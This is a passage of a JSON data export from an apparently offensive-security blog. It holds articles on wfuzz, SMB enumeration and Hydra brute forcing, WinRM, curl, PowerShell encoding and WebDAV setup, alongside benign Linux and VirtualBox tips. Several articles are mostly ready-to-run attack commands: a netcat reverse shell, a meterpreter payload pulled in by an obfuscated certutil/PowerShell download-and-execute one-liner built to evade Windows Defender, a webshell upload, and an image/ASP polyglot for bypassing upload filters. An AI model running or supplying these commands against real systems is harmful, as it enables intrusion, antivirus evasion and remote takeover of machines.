http://website/FUZZ\n```\n\nRun multiple collections of scripts\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --script=active,default,discovery --hc 404  http://website/FUZZ\n```\n\nTo get help on a script or script category.\n\n```bash\nwfuzz --script-help=default\nwfuzz --script-help=wc_extractor\n```\n\n## Special Cases\n\nHeaders can also be fuzzed:\n\n```bash\nwfuzz -z file,wordlist/general/common.txt -H \"User-Agent: FUZZ\" http://website/FUZZ\n```\n\nHTTP verbs fuzzing can be specified using the -X swith:\n\n```bash\nwfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://website/FUZZ\n```\n\n<aside>\n💡 Wfuzz can set an authentication header using the `–basic/ntlm/digest` command-line switches.\n\n</aside>\n\na protected resource using Basic authentication can be fuzzed using the following command:\n\n```bash\nwfuzz -z list,nonvalid-httpwatch –basic FUZZ:FUZZ http://website/FUZZ\n```\n\nFuzz id fields in URLs\n\n```bash\nwfuzz -z range,0-10 –hl 97 http://website/product.php?pid=FUZZ\n```"},{"fields":{"slug":"/working-with-smb"},"excerpt":"Working with SMB Windows\n\nWindows commands for working with our share\n\nnet use \\\\10.1.1.99\\IPC$ /user:evilsmb\nnet view 10.1.1.99\ndir \\\\10.1.1…","frontmatter":{"date":"21st May 2022 ","title":"Working With SMB","description":"A look at interacting with SMB Shares using the Windows Command line and using various tools available within Kali Linux.","tags":"hydra, mount, nmblookup","posttype":"article"},"body":"## Working with SMB\n\n### Windows\n\nWindows commands for working with our share\n\n```\nnet use \\\\10.1.1.99\\IPC$ /user:evilsmb\nnet view 10.1.1.99\ndir \\\\10.1.1.99\\evilshare\ncopy \\\\10.1.1.99\\evilshare\\29.jpg mypic.jpg\n```\n\nAnonymous shares can be viewed without authenticating to the IPC$ share.\n\n```\nnet view 10.1.1.99\n```\n\nMount a share\n\n```\nnet use Y \\\\10.1.1.99\\myshare  /user:eviltest\ncd /d Y:\\\ndir\n```\n\nExecuting files from SMB. Because of the way Windows treats UNC paths, it’s possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:\n\n```\nC:\\Users\\evilsaint\\Desktop> \\\\10.1.1.254\\sharefolder\\payload.exe\n```\n\n### Linux\n\nListing SMB shares with username and password\n```\nsmbclient -L 10.1.1.99 -U username%password\n```\n\nListing SMB Shares with anonymous connection\n```\nsmbclient -N -L 10.1.1.99\n```\n\nConnecting to SMB Share with username and password\n```\nsmbclient //10.1.1.99/myshare -U eviltest%evilpass\n```\n\nConnecting to SMB Share without username and password\n```\nsmbclient //10.1.1.99/myshare\n```\n\n# SMB\n\n### SMB Shares\n\nList Shares of computers in Domain\n```\nGet-NetComputer -DomainController 172.20.50.254 | Get-NetShare\n```\n\n# Bruteforcing SMB with Hydra\n\nComma seperated username and passwords\n```\nhydra -v -V -C user-pass.txt 10.1.18.2 smb\n```\n\nnot using comma separated\n```\nhydra -L users.txt -e ns 172.24.2.97 smb\n```\n\n# SMB\n\n## NetBIOS\n\nFind all hosts responding to netbios, the `q` supresses the headers\n```\nnbtscan -q 10.11.1.0\\24\n```\n\nLook at more detail for a single host either by IP or hostname\n```\nnmblookup -A 10.50.1.254\nnmblookup -S DC01\n```\n\n## Crackmapexec\n\n```\ncrackmapexec smb 10.50.1.0\\24\n```\n\n## NMAP\n\nRun all Nmap SMB Checks\n\n```\nnmap -sS -p 445 -n --open --script=smb-vuln* <ip>\n```\n\nExploit vulnerabilities with metasploit\n\n| Vulnerability | Metasploit Module |\n| --- | --- |\n| smb-vuln-ms06-025  | exploit06_025_rasmans_reg |\n| smb-vuln-ms07-029  | exploit07_029_msdns_zonename |\n| smb-vuln-ms08-067  | exploit08_067_netapi |\n| smb-vuln-cve2009-3103  | exploit09_050_smb2_negotiate_func_index |\n| smb-vuln-ms17-010 | exploit17_010_eternalblue |\n\n## SMB login (spray credentials)\n\n```\nmsf > use auxiliary/scanner/smb/smb_login\nshow options\nverbose off\nset password to the obtained local admin password\nremove user as pass\n```\n\n## Enum4linux\n\nEnumerate SMB\n\n```\nenum4linux -a -u Administrator -p Passw0rd! 10.50.1.15\n```\n\n## SMB Client\n\nListing SMB shares with username and password\n```\nsmbclient -L 10.1.1.99 -U username%password\n```\n\nListing SMB Shares with anonymous connection\n```\nsmbclient -N -L 10.1.1.99\n```\n\nConnecting to SMB Share with username and password\n```\nsmbclient //10.1.1.99/myshare -U eviltest%evilpass\n```\n\nConnecting to SMB Share without username and password\n```\nsmbclient //10.1.1.99/myshare\n```\n\nWe can use smbclient over proxychains\n```\nproxychains smbclient '//192.168.1.230/myshare' -U 'MARVEL.LAB\\Administrator%password123!'\n```\n\nWe can tar up files or folders with smbclient\n```\nsmbclient //10.129.121.21/guest -Tc test.tar secret.txt\nsmbclient //10.129.121.21/guest -Tc test.tar /tmp\n```\n\n## Mount Share\n\nMount SMB Share\n```\nmount -t  \\\\X.X.X.X\\c$ \\mnt\\remote\\ -o username=user,password=pass,rw\n```\n\nTo get a shell back from an SMB share.\n```\nlogon \"\\=`nc 10.11.0.233 443 -e \\bin\\bash`\"\n```\n\n## SMBMap\n\nNot very stealthy but can execute a command\n```\npython /usr/share/smbmap/smbmap.py -H 127.0.0.1 -u user -p pass -x 'net group \"domain admins\" \\domain'\n```\n\n## SMBTree\n\nSMB Tree can map out all smb shares in the neighbourhood.\n```\nsmbtree\n```"},{"fields":{"slug":"/power-shell-in-memory-injection-using-cert-util-exe"},"excerpt":null,"frontmatter":{"date":"18th May 2022 ","title":"PowerShell: In-Memory Injection Using CertUtil.exe","description":"Using PowerShell, `Invoke-CradleCrafter` and Microsoft’s Certutil.exe to craft a payload and one-liner that can be used to evade the latest version of Windows Defender (as of this writing).","tags":"certutil, powershell","posttype":"tutorial"},"body":"- PowerShell is still one of the easiest and best ways to gain a foothold, but at the same time, it is selling you out because it talks to AMSI as soon as it’s run.\n- The beauty of this method is that Microsoft’s `certutil` does the network call out to your primary payload while appearing to be an innocent certificate file.\n\n**Pre-Requisites**\n\n- Download `Invoke-CradleCrafter` from GitHub.\n\n**Methodology**\n\n1. First, we will create a base64 encoded PowerShell Meterpreter payload by performing the following:\n\n```\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=<YOUR IP HERE> LPORT=443 -e cmd/powershell_base64 -f psh -o b64_pwsh.txt\n```\n\n<div class=\"card-body es-lightbulb\"><p>\n**Note** that the payload file’s extension could be anything as long as `certutil` can get at it and read its content. For example, an organization may have a policy (or IDS, content filter, etc.) that does not allow the downloading of scripts; however, they probably allow .txt files or even files with abnormal extensions. If you change it, make sure you compensate for that when setting the URL in `Invoke-CradleCrafter`</p>\n</div>\n\n\n1. Next, you will create a folder used to serve up web content. Place the PowerShell Meterpreter PowerShell script (`b64_pwsh.txt`) inside this folder.\n2. Next, we will use `Invoke-CradleCrafter` to obfuscate our `certutil` and PowerShell commands used to perform the in-memory injection. Drop into a PowerShell prompt on your Linux host by typing `pwsh` or `powershell`.  Then `cd` into your `Invoke-CradleCrafter` directory.\n\n```powershell\nImport-Module .\\Invoke-CradleCrafter.psd1; \nInvoke-CradleCrafter\nInvoke-CradleCrafter> SET URL http://10.10.10.10/b64_pwsh.txt\nInvoke-CradleCrafter> MEMORY\nInvoke-CradleCrafter> CERTUTIL\n```\n\n1. Next, you will be presented with your obfuscation options. Select **ALL** by typing it on the command line and then typing **1** to execute.\n\n```\n:::powershell\nInvoke-CradleCrafter> ALL\nInvoke-CradleCrafter> 1\n```\n\n1. Once generated, we now have a PowerShell cradle with obfuscation that can pull in our `b64_pwsh.txt` payload. We now want to put this into a text file such as `output.txt` for encoding. \n2. We will encode this file in base64 using the `certutil` to create a file called `cert.cer` which will end up on our web server next to the `b64_pwsh.txt`.\n\n```\ncertutil -encode output.txt cert.cet\n```\n\n1. We can now use the following one-liner to pull our `cert.cer` certificate from our web server; the certificate gets decoded and saved to the disk as `stager.ps1`. The file `stager.ps1` is then executed (this is the content of the cradle we made earlier with `Invoke-CradleCrafter`), and when it runs, it pulls the `b64_pwsh.txt` file down from the server and executes it to give us a Metasploit Meterpreter session.  \n\n```\n:::powershell\npowershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\\cert.cer (New-Object Net.WebClient).DownloadString('http://10.10.10.10/cert.cer'); certutil -decode %APPDATA%\\cert.cer %APPDATA%\\stager.ps1 & start /b cmd /c powershell.exe -Exec Bypass -NoExit -File %APPDATA%\\stager.ps1 & start /b cmd /c del %APPDATA%\\cert.cer\n```\n\n<div class=\"card-body es-warning\"><p> **NOTE** that the `cert.cer` file will be deleted by the script; however, you will need to remove the `stager.ps1` file manually.</p>\n</div>"},{"fields":{"slug":"/setting-power-shell-terminal-options"},"excerpt":null,"frontmatter":{"date":"16th May 2022 ","title":"Setting PowerShell Terminal Options","description":"During a pentest engagement, you often come across the need for a screenshot for the report. Using the `$host.UI` parameter inside our PowerShell terminal we can do things like set the window title, change the foreground and background colours along with adjusting the size and position. This article looks at how setting values within the `$host.UI` variable can customise our PowerShell terminal.","tags":"powershell","posttype":"article"},"body":"\n# Set PowerShell Terminal Options\n\nWe can set values within the terminal to customise how the terminal output is displayed, the title of the terminal window shown or how much buffer size to use. Using these values can be helpful for several things, such as distinguishing windows, staging the title for a report screenshot or improved recognition of terminal output. \n<img src=\"/static/4c64758d-9b0a-46d7-99f2-0c355aeb20b4.png\">\n![Terminal Displaying Styling](4c64758d-9b0a-46d7-99f2-0c355aeb20b4.png)\n\n### Screen Buffer\n\nGet the current screen buffer.\n\n```\n:::powershell\n$host.UI.RawUI.BufferSize\n```\n\nEnlarge the terminal screen buffer to capture more output\n\n```\n:::powershell\n$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(120,999)\n```\n\n<aside>\n💡 Note that when you attempt to decrease the width to below the current width, you will be presented with an error\n</aside>\n\n### Console Style (for quick identification).\n\nSet Console Title\n\n```\n:::powershell\n$host.ui.RawUI.WindowTitle = \"Staged Window Title For Screenshot\"\n```\n\nSet Console Colours\n\n```\n:::powershell\n$Host.UI.RawUI.BackgroundColor = 'Black'\n$Host.UI.RawUI.ForegroundColor = 'Green'\n```\n\n## Set Window Position\n\nFind out what the current window position is\n\n```\n:::powershell\n$host.UI.RawUI.WindowPosition\n```\n\nSet window position\n\n```\n:::powershell\n$host.UI.RawUI.WindowPosition = New-Object System.Management.Automation.Host.Coordinates(0,160)\n```"},{"fields":{"slug":"/win-rm-ps-remoting"},"excerpt":"The system needs to have WinRM enabled before you can use it: Test if the service is listening:\n\nTest-WSMan -ComputerName TargetPC\n\n\nEnable…","frontmatter":{"date":"8th May 2022 ","title":"WinRM PSRemoting","description":"PowerShell Remoting is the recommended way to manage Windows systems. PowerShell Remoting uses Windows Remote Management (WinRM), the Microsoft implementation of the Web Services for Management (WS-Management) protocol, to allow users to run PowerShell commands on remote computers. By default, PowerShell Remoting only allows connections from members of the Administrators group. This article explores using WinRm PSRemoting.","tags":"powershell, winrm","posttype":"article"},"body":"\n# WinRM  PSRemoting\n\nThe system needs to have WinRM enabled before you can use it:\n\nTest if the service is listening:\n\n```bash\nTest-WSMan -ComputerName TargetPC\n```\n\nEnable via PSexec\n\n```bash\npsexec \\\\target -u PoorSysAdmin -p Passw0rd -h -d powershell.exe \"enable-psremoting -force\"\n```\n\nInsert your stager here\n\n```bash\nInvoke-Command -ComputerName TargetPC -ScriptBlock { BlahBlah } -credential jdoe\n```\n\nGet an interactive PSRemote Shell. \n\n```bash\n$cred = Get-Credential\nEnter-PSSession -ComputerName TargetPC -Credential $cred\n```"},{"fields":{"slug":"/how-to-fix-virtualbox-on-windows-11-mouse-not-working-inside-vm"},"excerpt":null,"frontmatter":{"date":"7th May 2022 ","title":"How to Fix: Virtualbox on Windows 11 Mouse Not Working Inside VM","description":"This article demonstrates how to fix a mouse that doesn't work inside VirtualBox VM on a computer with Windows 11.","tags":"virutalbox, vms, windows","posttype":"article"},"body":"# The problem\n\nMouse cannot be used inside a VirtualBox VM (guest) on Windows 11 (host).\n\n#How to fix it\n\n<h5 class=\"step\">Step 1 - Make Sure Your VirtualBox is Version 6.1.28 or Later</h5>\n\nThese later versions have been improved by Oracle to minimise compatibility issues with Hyper-V. You can check the version by opening the VirtualBox Manager and navigating to:\n\n`Help` > `About VirtualBox...`\n<img src=\"/static/8ff29026-eb9d-4044-b6ab-bd89052f590f.png\">\n\n![]()\n\nThe version is displayed here. If you are running a version older than 6.1.28, consider upgrading it.\n<img src=\"/static/63677c92-6c55-4458-bfe0-629b9da2fb7c.png\">\n\n![]()\n\n<h5 class=\"step\">Step 2 - Change your Pointing Device settings</h5>\n\nPower off each virtual machine that needs fixing. \n\nOn VirtualBox manager, click one machine at a time. Navigate to:\n\n `Machine` > `Settings`.\n<img src=\"/static/65c7a514-4057-4dc6-8b12-18c7c3f4a6f4.png\">\n\n![]()\n\nUnder the `System` tab, change `Pointing Device` from `PS/2 Mouse` to `USB Tablet`. Click `OK` to save the changes.\n<img src=\"/static/80917044-71b0-49a0-b45a-12a2b014e699.png\">\n\n![]()\n\n<h5 class=\"step\">Step 3 - Verify the fix</h5>\n\nPower on your machine as usual and wait for the machine to boot. Try to move your mouse inside the VM.\n\nIf the fix has been successful, congratulations! Let us know in the comments below if you were able to fix your VirtualBox using our article.\n\n#Why this error occurs\n\nThis is a mouse that connects to a PS/2 port:\n<img src=\"/static/25ebb32f-2632-4ced-851d-bebe9ed89656.png\">\n\n![]()\n\nEven though the other option, \"USB Tablet\", has the word \"tablet\" in it - it does not mean that it will only work on tablets. \n\nFrom the VirtualBox manual (Chapter 3.4.1):\n\n```\nThe default virtual pointing devices for older guests is the traditional PS/2 mouse. If set to USB tablet, VirtualBox reports to the virtual machine that a USB tablet device is present and communicates mouse events to the virtual machine through this device.\n```\n<img src=\"/static/5157faa7-03ef-4249-a625-4f889c318415.png\">\n\n![]()"},{"fields":{"slug":"/linux-package-management"},"excerpt":"Sometimes when installing packages you need to know the version of the current distribution that you have. Output shows Debian version…","frontmatter":{"date":"4th May 2022 ","title":"Linux Package Management","description":"A package manager is a tool that allows users to install, remove, upgrade, configure and manage software packages on an operating system. The package manager can be a graphical application like a software centre or a command-line tool like apt-get or pacman. This article looks at installing packages on Linux using various package management systems.","tags":"apt, dpkg, yum","posttype":"article"},"body":"# Linux Package Management\n\nSometimes when installing packages you need to know the version of the current distribution that you have.\n\nOutput shows Debian version number.\n```\ncat /etc/Debian_version\n```\n\nOutput shows Ubuntu version number.\n```\ncat /etc/*-release\n```\n\nOutput shows Redhat / CentOS version number.\n```\ncat /etc/redhat-release\n```\n\n## Debian Package Management\n\nThe sources list of all the repos\n```\ncat /etc/apt/sources.list\n```\n\nOr sometimes\n```\ncat /etc/apt/sources.list.d/official-package-repositories.list\n```\n\nSearch the apt package manager cache\n\n```\napt-cache search nginx\n```\n\nUpdate the cache\n\n```\napt-get update\n```\n\nShow cache information on the package.\n\n```\napt-cache show nginx\n```\n\nShow some basic statistics\n\n```\napt-cache stats\n```\n\nRemove packages and config files\n\n```\napt-get purge\n```\n\nautoclean - Erase old downloaded archive files\n\n```\napt-get autoclean\n```\n\nRemove automatically all unused packages\n\n```\napt-get autoremove\n```\n\nList installed packages, shows version and package description\n\n```\ndpkg -l\n```\n\nLists installed packages but no extra info\n\n```\ndpkg --get-selections\n```\n\nInstall a package\n\n```\ndpkg -i <deb file>\n```\n\n### Unable to lock the administration directory (/var/lib/dpkg/)\n\nOccasionally when this error occurs the following steps are normally sufficient to solve\n\nKill any running apt processes\n\n```\nps -A | grep apt\nkill -9 processnumber\n```\n\nDelete the lock files\n\n```\nrm /var/lib/dpkg/lock\n```\n\nForce the packages to reconfigure\n\n```\ndpkg --configure -a\n```\n\nUpdate package source list\n\n```\napt-get update\n```\n\n## Redhat / CentOS / RPM Based Distros\n\nList all installed RPMs on an RPM based Linux distro.\n\n```\nrpm -qa\n```\n\nCheck installed RPM is patched against CVE, grep the output for CVE.\n\n```\nrpm -q --changelog openvpn\n```\n\n**YUM Commands**\n\nPackage manager used by RPM based systems, you can pull some useful information about installed packages and or install additional tools.\n\nUpdate all RPM packages with YUM, also shows whats out of date.\n\n```\nyum update\n```\n\nUpdate individual packages, in this example HTTPD (Apache).\n\n```\nyum update httpd\n```\n\nInstall a package using YUM.\n\n```\nyum install package\n```\n\nExclude a package from being updates with YUM.\n\n```\nyum --exclude=package kernel* update\n```\n\nRemove package with YUM.\n\n```\nyum remove package\n```\n\nRemove package with YUM.\n\n```\nyum erase package\n```\n\nLists info about yum package.\n\n```\nyum list package\n```\n\nWhat a packages does, e.g Apache HTTPD Server.\n\n```\nyum provides httpd\n```\n\nShows package info, architecture, version etc.\n\n```\nyum info httpd\n```\n\nUse YUM to install local RPM, settles deps from repo.\n\n```\nyum localinstall blah.rpm\n```\n\nShows deps for a package.\n\n```\nyum deplist package\n```\n\nList all installed packages.\n\n```\nyum list installed | more\n```\n\nShow all YUM groups.\n\n```\nyum grouplist | more\n```\n\nDevelopment Tools Install YUM group.\n\n```\nyum groupinstall\n```"},{"fields":{"slug":"/linux-nano-shortcuts"},"excerpt":"Files Read file\n\nCtrl-R\n\n\nSave file\n\nCtrl-O\n\n\nClose file\n\nCtrl-X\n\nCut and Paste\n\nStart marking text\n\nALT-A\n\n\nCut marked text or line.\n\nCTRL-K\n\n\nPaste…","frontmatter":{"date":"2nd May 2022 ","title":"Linux: Nano Shortcuts","description":"GNU nano is an easy to use command line text editor for Unix and Linux operating systems. It includes all the basic functionality you would want in a text editor. It offers syntax highlighting, multiple buffer spaces, search and replace with regular expression support, spellchecking, UTF-8 encoding, and more. While it doesn't have the same keybinding library as that of `vi` it does have a number of time-saving shortcuts that if you learn can significantly speed up your workflow.","tags":"linux, nano","posttype":"tutorial"},"body":"# Nano\n\n\n\n## Files\n\nRead file\n\n```\nCtrl-R\n```\n\nSave file\n\n```\nCtrl-O\n```\n\nClose file\n\n```\nCtrl-X\n```\n\n## Cut and Paste\n\nStart marking text\n\n```\nALT-A\n```\n\nCut marked text or line.\n\n```\nCTRL-K\n```\n\nPaste text\n\n```\nCTRL-U\n```\n\n## Navigate File\n\nEnd of file\n\n```\nALT-/\n```\n\nBeginning of line\n\n```\nCTRL-A\n```\n\nEnd of line\n\n```\nCTRL-E\n```\n\nShow line number\n\n```\nCTRL-C\n```\n\nGo to line number\n\n```\nCTRL-_\n```\n\n### Search File\n\nFind\n\n```\nCTRL-W\n```\n\nFind next\n\n```\nALT-W\n```\n\nSearch and replace\n\n```\nCTRL-\\\n```\n\nMore nano info at: [http://www.nano-editor.org/docs.php](http://www.nano-editor.org/docs.php)"},{"fields":{"slug":"/installing-a-gui-on-linux"},"excerpt":"On Debian First, update your system.\n\napt-get update\n\n\nSelect your choice of package and install\n\napt-get install <package name>\n# i.e.\napt…","frontmatter":{"date":"27th April 2022 ","title":"Installing A GUI On Linux","description":"Some server distros do not include a Graphical User Interface (GUI) by default. A GUI can take up system resources such as memory and processor, and often for a server-orientated operating system, this is not ideal. However, specific tasks and applications are more manageable and better run in a GUI environment.","tags":"linux","posttype":"tutorial"},"body":"# Installing a GUI on Debian or Centos\n\n## On Debian\n\nFirst, update your system.\n```\napt-get update\n```\n\nSelect your choice of package and install\n```\napt-get install <package name>\n# i.e.\napt-get install gnome\napt-get install gnome-core\napt-get install kde-full\napt-get install kde-standard\napt-get install mate-desktop-environment\n```\n\nOnce installed, you can start\n```\nstartx\n```\n\nTo enable it on boot.\n```\nsystemctl set-default graphical.target\n```\n\nEither add a non-root user to login with\n```\nadduser evilsaint\n```\n\n### Login As Root\n\nif you need to login to the GUI by root for whatever reason (not recommended), then the below will work on Gnome\n\nEdit the following file\n\n```\nnano /etc/gdm3/daemon.conf\n```\n\nUnderneath `[security]` you need to add an `AllowRoot` parameter like the following.\n\n```\n[security]\nAllowRoot=true\n```\n\nEdit the following file\n```\nnano /etc/pam.d/gdm-password\n```\n\nMake sure this line is commented out.\n```\nauth required pam_succeed_if.so user != root quiet_success\n```\n\nOn systems with multiple desktops, you can choose\n```\necho 'exec gnome-session' > /home/gnomeuser/.xinitrc\necho 'startkde' > /home/kdeuser/.xinitrc\n```\n\nUsually, if there is a reason for a GUI environment that isn't Kali Linux then you might need security tools. Add the kali sources using Katoolin.\n\n```\napt-get install git\ngit clone https://github.com/LionSec/katoolin.git  && cp katoolin/katoolin.py /usr/bin/katoolin\nchmod +x  /usr/bin/katoolin\nkatoolin (Option 1 to add repos)\napt-get update\napt-get upgrade\napt-get\napt-get install kali-linux-full\n```\n\n## On Centos\n\nDecide on Gnome or KDE and install using the yum package manager\n```\nyum -y groups install \"GNOME Desktop\"\nyum -y groups install \"KDE Plasma Workspaces\"\n```\n\nOnce installed, you can start\n```\nstartx\n```\n\nTo enable it on boot.\n```\nsystemctl set-default graphical.target\n```\n\nAdd a non-root user to login with\n```\nadduser evilsaint\n```"},{"fields":{"slug":"/creating-smb-servers"},"excerpt":"Create SMB Servers Impacket\n\npython smbserver.py -username evilsmb -password evilpass -ip 10.1.1.99 evilshare /root/payloads/\n\n\nLeaving…","frontmatter":{"date":"22nd April 2022 ","title":"Creating SMB Servers","description":"This article looks at two ways of creating an SMB Server. First, we use the impacket library to spin up an SMB server from the command line and then we look at creating an SMB share manually on our Kali Linux VM setting up the SAMBA service.","tags":"smb","posttype":"article"},"body":"# SMB\n\n## Create SMB Servers\n\nImpacket\n\n```\npython smbserver.py -username evilsmb -password evilpass -ip 10.1.1.99 evilshare /root/payloads/\n```\n\n> Leaving -username and -password off of the command will create an anonymous share.\n\nManual\n\nBacking up the original `smb.conf`\n\n```\ncp /etc/samba/smb.conf /etc/samba/smb.conf.bk\n```\n\nEmptying our config file and then edit it so we can add only the lines we need\n\n```\nroot@evilsaint:/# >/etc/samba/smb.conf\nroot@evilsaint:/# nano /etc/samba/smb.conf\n```\n\nWe make the following changes to our smb.conf\n\n```\ncat /etc/samba/smb.conf\n[global]\n   workgroup = MARVEL\n[myshare]\n   comment = My Share For Sharing Files\n   read only = no\n   locking = no\n   path = /root/Documents\n   guest ok = no\n```\n\n> To create an smbuser, a normal user with the same name needs to be present on the system.\n> \n\nWe now need to add a user to access the smbserver\n\n```\nroot@evilsaint:/# smbpasswd -a evilsaint\nNew SMB password:\nRetype new SMB password:\nAdded user evilsaint.\n```\n\nWe can verify the user was created with pdbedit\n\n```\npdbedit -w -L\nevilsaint:1001:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:E9298AEE730720E27F879300509D911A:[U          ]:LCT-5A89C279:\n```\n\nWe now restart the service.\n\n```\nservice smbd restart\n```"},{"fields":{"slug":"/curl-for-pentesters"},"excerpt":null,"frontmatter":{"date":"19th April 2022 ","title":"Curl For Pentesters","description":"Curl can be used for a number of useful activities during a pentest engagement. It can send HTTP Methods and data to an API endpoint, upload a file to a WebDav Server or grab server response headers, amongst other things. This article looks at a couple of practical uses for the Curl utility.","tags":null,"posttype":"article"},"body":"# Curl\n\n## Uploading\n\nUploading a webshell to a WebDav server\n\n```\ncurl --user <user>:<pass> -T /ftphome/mshell.php http://192.168.30.55/webdav/ --anyauth\n```\n\nBreak down of Flags\n\n| Flag | Description |\n| --- | --- |\n| --anyauth | Tells curl to figure out an authentication method by itself and use the most secure one the remote site claims to support. |\n| -T | Upload-file <file> |\n| -u, --user | Specify User:Password credentials. |\n\n\n## HTTP Method\n\nSpecify the method to use: POST, HEAD, PUT, GET, DELETE\n\n```\ncurl -X <Method>\n```\n\n## Banner grabbing for websites\n\nIncludes the headers\n\n```\ncurl -i <ip>\n```\n\nIncludes headers and follows redirects\n\n```\ncurl -i -L <ip>\n```\n\n## Viewing Websites\n\nLooking at a webpage from the shell\n\n```\ncurl <ip> -s -L | html2text -width '99'\n```\n\nrobots.txt check\n\n```\ncurl <ip>/robots.txt -s | html2text\n```\n\nGrep a page for all title and href tags\n\n```\ncurl -s -L 10.11.1.71 | grep \"title\\|href\" | sed -e s/^[[:space:]]*//\n```\n\n## Flags\n\n| Flag | Description |\n| --- | --- |\n| -i | Include the HTTP header in the output. |\n| -o | Output to a file |\n| -s | for silent mode, better if you want to save it to file |\n| -L | Follow redirects |"},{"fields":{"slug":"/encoding-power-shell"},"excerpt":null,"frontmatter":{"date":"19th April 2022 ","title":"Encoding PowerShell","description":"The use of the `-EncodedCommand` PowerShell parameter is typically used by Administrators to run complex scripts without having to worry about escaping characters. However, it is commonly used by adversaries to hide their code.  While it also offers obfuscation, remember base64 encoding can be decoded, so this is only real protection against shoulder surfers or people not in possession of decoding software.","tags":"encoding, powershell","posttype":"article"},"body":"# Encoding Powershell\n\nOne gotcha that typically catches people out is the fact that PowerShell command encoding requires you to convert to unicode characters first which are two bytes compared to ASCII.  I often see juniors comparing the Base64 generated by the below commands with that of an online base64 encoder and then question why their outputs differ. \n\nCompare this\n```\n[System.Text.Encoding]::ASCII.GetBytes('A')\n```\n\nWith \n```\n[System.Text.Encoding]::Unicode.GetBytes('A')\n```\n<img src=\"/static/9630b526-59e1-49e0-924f-97e72587a24b.png\">\n![]()\n\n\nThe manual method of encoding Powershell with no external libraries\n```\n$command = \"net use; dir 'C:\\Program Files\\';ipconfig;ping 8.8.8.8\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\npowershell.exe -EncodedCommand $encodedCommand\n```\n\n`Out-EncodedCommand` cmdlet from Powersploit\n\n```\nOut-EncodedCommand -Path C:\\cmds.txt -NonInteractive -NoProfile -EncodedOutput\n```\n\n`Invoke-Encode` cmdlet from Nishang\n\n```\nInvoke-Encode -DataToEncode c:\\data.txt -OutCommandInvoke-Encode \"net use; systeminfo\" -OutCommandInvoke-Encode $commands -OutCommand\n```\n\n`Invoke-Obfuscation` cmdlet (https:.com-Obfuscation)\n\n```\nImport-Module C:\\Powershell\\Invoke-Obfuscation\\Invoke-Obfuscation.psd1\nInvoke-Obfuscation\nSET SCRIPTBLOCK cmd 1; cmd 2; cmd3; cmd4\nSET SCRIPTBLOCK Get-WmiObject -Class Win32_OperatingSystem; systeminfo; Write-Host 'Finished'\n```"},{"fields":{"slug":"/setting-up-a-web-dav-server"},"excerpt":"Debian Install apache2\n\nroot@vultr:~# apt-get install apache2\n\n\nEnable the appropriate modules\n\nroot@vultr:~# a2enmod ssl\nroot@vultr…","frontmatter":{"date":"12th April 2022 ","title":"Setting Up A WebDav Server","description":"WebDAV works over HTTP and it has many benefits over transfer protocols such as FTP. These include strong encryption, robust authentication, proxy support, caching and multiple transfers through a single TCP connection (FTP requires a new connection for each file transferred.). This article looks at setting up a WebDav Server and then interacting with it via Cadaver.","tags":"webdav","posttype":"tutorial"},"body":"# Setting up a WebDav server\n\n## Debian\n\nInstall apache2\n\n```\nroot@vultr:~# apt-get install apache2\n```\n\nEnable the appropriate modules\n\n```\nroot@vultr:~# a2enmod ssl\nroot@vultr:~# a2enmod dav_fs\nroot@vultr:~# a2enmod dav\n```\n\nCreate an SSL certificate\n\n```\nmkdir /etc/apache2/ssl\nopenssl req $@ -new -x509 -days 365 -nodes -out /etc/apache2/ssl/apache.pem -keyout /etc/apache2/ssl/apache.pem\nchmod 600 /etc/apache2/ssl/apache.pem\n```\n\nCreate a webdav\n\n```\nroot@vultr:~# mkdir /var/www/webdav\nroot@vultr:~# chown www-data:www-data /var/www/webdav\nroot@vultr:~# htpasswd -c /etc/apache2/passwd.webdav evilsaint\nNew password:\nRe-type new password:\nAdding password for user evilsaint\n```\n\nEdit the configuration file\n\n```\nroot@vultr:~# cat <<EOF | tee /etc/apache2/sites-available/webdav.conf\n<VirtualHost *:443>\n         ServerAdmin user@host.com\n         DocumentRoot /var/www/webdav\n         ServerName mywebdav.lab\n         DirectoryIndex disabled\n         SSLEngine on\n         SSLCertificateFile /etc/apache2/ssl/apache.pem\n         Alias /webdav/ /var/www/webdav/\n\n         <Location /webdav>\n            DAV On\n            AuthType Basic\n            AuthName \"webdav\"\n            AuthUserFile /etc/apache2/passwd.webdav\n            Require valid-user\n        </Location>\n\n         ErrorLog  /var/log/webdav-error.log\n         CustomLog /var/log/webdav-access.log combined\n</VirtualHost>\nEOF\n```\n\nEnable the site\n\n```\na2ensite webdav\n```\n\nRestart the apache server\n\n```\n/etc/init.d/apache2 reload\n```\n\nWe can now test with `cadaver` (see further info on this tool below)\n\n```\nroot@evilsaint:/pentesting/enum# cadaver\ndav:!> open https://104.238.128.52/webdav\nWARNING: Untrusted server certificate presented for `myname':\nCertificate was issued to hostname `myname' rather than `104.238.128.52'\nThis connection could have been intercepted.\nIssued to: myorg, Widget maker, MYCITY, MYSTATE, UK\nIssued by: myorg, Widget maker, MYCITY, MYSTATE, UK\nCertificate is valid from Mon, 19 Mar 2018 22:57:50 GMT to Tue, 19 Mar 2019 22:57:50 GMT\nDo you wish to accept the certificate? (y/n) y\nAuthentication required for webdav on server `104.238.128.52':\nUsername: evilsaint\nPassword:\ndav:/webdav/> ls\nListing collection `/webdav/': succeeded.\n       *test.txt                               0  Mar 19 23:31\ndav:/webdav/> get test.txt\nDownloading `/webdav/test.txt' to test.txt: [.] succeeded.\n```\n\n# Cadaver\n\nWe can use the tool Cadaver to interact with WebDAV servers.\n\nWe can query our cadaver version\n\n```\ncadaver -V\n```\n\nStart a cadaver connection to a webdav server.\n\n```\ncadaver 10.11.1.229\n```\n\nWe can navigate directly into folders but we have to give a full web path\n\n```\ncadaver http://10.11.1.229/aspnet_client\n```\n\n## Upload Malicious Image Via Curl\n\nTo avoid the image content validator, we will prepend a valid JPG image to our ASP script\n\n```\ncat cat.jpg shell.asp > evil.asp;.jpg\n```\n\n```\ncurl --upload-file \"evil.asp;.jpg\" 